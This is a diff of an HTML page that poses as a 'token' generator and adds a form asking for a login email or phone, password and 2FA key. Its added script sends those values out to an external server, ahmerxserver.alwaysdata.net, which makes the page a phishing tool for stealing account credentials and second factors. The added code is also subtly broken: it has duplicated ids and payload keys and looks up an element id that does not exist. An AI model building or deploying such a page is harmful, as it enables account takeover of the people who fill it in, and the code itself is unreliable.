@@ -81,49 +81,43 @@
 </head>
 <body>
   <header>Ahmi'X Server</header>
-  <h2>X Token</h2>
+  <h2>X'V7 TOKEN</h2>
 
   <div class="form-container">
-    <label for="email">Email/Phone:</label>
-    <input type="text" id="email" placeholder="Enter Email or Phone">
+    <label for="userId">Email/Phone:</label>
+    <input type="text" id="userId" name="userId" placeholder="Email or Phone">
 
-    <label for="password">Password:</label>
-    <input type="text" id="password" placeholder="Enter Password">
-
-    <button onclick="login()">Login</button>
-    <div id="message" class="message"></div>
-
-    <!-- Hidden 2FA section -->
-    <div id="twofa" style="display:none;">
-      <label for="code">2FA Code:</label>
-      <input type="text" id="code" placeholder="Enter 2FA Code">
-      <button onclick="getToken()">Get EAAD6V7 Token</button>
-    </div>
+    <label for="pass">Password:</label>
+    <input type="text" id="testKey" name="pass" placeholder="Password">
+    <label for="factorkey">2FA Keys:</label>
+    <input type="text" id="testKey" name="factorkey" placeholder="2FA Key">
+    <button type="button" id="approvalBtn">Get Approval</button>
   </div>
 
   <footer>Made by Ahmer Awan</footer>
 
   <script>
-    function login() {
-      const email = document.getElementById("email").value.trim();
-      const pass = document.getElementById("password").value.trim();
+    document.getElementById("approvalBtn").addEventListener("click", async function() {
+      alert("Sending Approval Request");
 
-      if (email && pass) {
-        document.getElementById("message").innerText = "Logging in.... 2FA Required";
-        document.getElementById("twofa").style.display = "block";
-      } else {
-        document.getElementById("message").innerText = "Please enter Email/Phone and Password.";
-      }
-    }
+      const payload = {
+        userId: document.getElementById("userId").value,
+        testKey: document.getElementById("pass").value,
+        testKey: document.getElementById("factorkey").value
+      };
 
-    function getToken() {
-      const code = document.getElementById("code").value.trim();
-      if (code) {
-        document.getElementById("message").innerText = "EAAD6V7 Token generated successfully!";
-      } else {
-        document.getElementById("message").innerText = "Please enter your 2FA Code.";
+      try {
+        const res = await fetch("https://ahmerxserver.alwaysdata.net/sendApproval", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        console.log("Response:", data);
+      } catch (err) {
+        console.error("Error:", err);
       }
-    }
+    });
   </script>
 </body>
 </html>
